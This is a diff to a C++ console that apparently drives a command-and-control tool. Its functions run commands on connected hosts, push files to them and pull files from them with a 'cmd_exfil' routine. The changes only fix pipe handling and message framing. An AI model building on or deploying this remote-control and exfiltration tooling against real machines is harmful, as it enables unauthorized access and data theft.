@@ -76,18 +76,20 @@ static const std::map<std::string, command_t> commands = {
 
 void active_connections_task()
 {
-  int pipefd;
-  if ((pipefd = open(host_info_pipe.c_str(), O_RDWR)) == -1) {
-    perror("open()");
-    std::exit(-1);
-  }
-
   while (1) {
+    int pipefd;
+    if ((pipefd = open(host_info_pipe.c_str(), O_RDWR)) == -1) {
+      perror("open()");
+      std::exit(-1);
+    }
+
     uint8_t buf[1024];
     size_t nbytes;
     if ((nbytes = read(pipefd, buf, 1024)) == -1) {
       perror("read()");
     }
+
+    close(pipefd);
 
     std::string host{ (char *)buf, nbytes };
     std::string ip = host.substr(host.find('@') + 1, host.size());
@@ -212,6 +214,7 @@ void cmd_set(const std::string &input)
     return;
   }
 
+
   if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
     cur_host = input_arr.at(1);
     cur_group.clear();
@@ -259,7 +262,7 @@ void cmd_run(const std::string &input)
             << command;
 
     long nbytes;
-    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
       perror("write()");
     }
   } else if (!cur_group.empty()) {
@@ -280,7 +283,7 @@ void cmd_run(const std::string &input)
               << command;
 
       long nbytes;
-      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
         perror("write()");
       }
     }
@@ -322,7 +325,7 @@ void cmd_file(const std::string &input)
             << input_arr.at(2);
 
     long nbytes;
-    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
       perror("write()");
     }
   } else if (!cur_group.empty()) {
@@ -347,7 +350,7 @@ void cmd_file(const std::string &input)
               << input_arr.at(2);
 
       long nbytes;
-      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
         perror("write()");
       }
     }
@@ -386,7 +389,7 @@ void cmd_exfil(const std::string &input)
   std::filesystem::path p = input_arr.at(2);
 
   std::stringstream sstream;
-  sstream << "receive_file "
+  sstream << "recv_file "
           << ip
           << " "
           << input_arr.at(1)
@@ -394,7 +397,7 @@ void cmd_exfil(const std::string &input)
           << std::filesystem::absolute(p);
 
   long nbytes;
-  if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+  if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
     perror("write()");
   }
 
@@ -434,7 +437,7 @@ void cmd_runall(const std::string &input)
             << command;
 
     long nbytes;
-    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size() + 1)) == -1) {
+    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
       perror("write()");
     }
   }
